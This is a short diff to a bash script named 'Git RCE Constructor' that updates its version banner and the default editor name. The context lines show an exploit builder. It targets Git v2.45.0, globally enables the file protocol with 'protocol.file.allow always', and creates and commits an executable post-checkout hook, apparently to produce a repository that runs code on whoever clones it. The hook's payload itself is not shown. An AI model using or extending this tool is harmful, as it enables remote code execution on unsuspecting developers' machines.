@@ -1,7 +1,7 @@
 #!/bin/bash
 set +x
-echo Git RCE Constructor v1.6 \(Local Mode\)
-echo -e "\033]0;Git RCE Constructor v1.6 (Local Mode)\007"
+echo Git RCE Constructor v1.7 \(Local Mode\)
+echo -e "\033]0;Git RCE Constructor v1.7 (Local Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 set -x
 git config --global protocol.file.allow always
@@ -48,7 +48,7 @@ EOF
 chmod +x scripts/hooks/post-checkout
 git_editor=$(git config --get core.editor)
 if [ -z "$git_editor" ]; then
-git_editor="vim"
+git_editor="VIM"
 fi
 "$git_editor" "$PWD/scripts/hooks/post-checkout"
 git add scripts/hooks/post-checkout
